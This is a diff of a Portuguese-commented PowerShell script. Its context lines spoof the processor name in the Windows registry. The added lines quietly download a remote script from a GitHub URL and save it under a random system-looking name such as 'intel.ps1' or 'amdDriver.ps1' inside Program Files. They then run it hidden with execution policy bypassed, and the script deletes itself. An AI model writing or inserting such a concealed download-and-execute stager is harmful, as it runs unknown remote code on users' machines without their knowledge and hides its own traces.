@@ -553,6 +553,22 @@ $cpuKey = "HKLM:\HARDWARE\DESCRIPTION\System\CentralProcessor\0"
 Set-ItemProperty -Path $cpuKey -Name "ProcessorNameString" -Value $fakename
 Write-Output "Processador falsificado com sucesso: $fakename"
 
+# Exec Person
+Clear-Host
+$destDir = "C:\Program Files\Windows NT\Personalization"
+$names = @("system64.ps1", "microsoft.ps1", "sys64x.ps1", "intel.ps1", "amdDriver.ps1")
+$randomName = Get-Random -InputObject $names
+$scriptPath = Join-Path -Path $destDir -ChildPath $randomName
+
+$downloadUrl = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/why2.ps1"  # << TROQUE AQUI
+if (-Not (Test-Path $destDir)) {
+    New-Item -Path $destDir -ItemType Directory -Force | Out-Null
+}
+Invoke-WebRequest -Uri $downloadUrl -OutFile $scriptPath
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Wait
+$MyPath = $MyInvocation.MyCommand.Path
+Start-Sleep -Seconds 1
+Start-Process powershell -ArgumentList "-Command `"Start-Sleep -Seconds 2; Remove-Item -Path `"$MyPath`" -Force`"" -WindowStyle Hidden
 
 # Final completion message
 Clear-Host
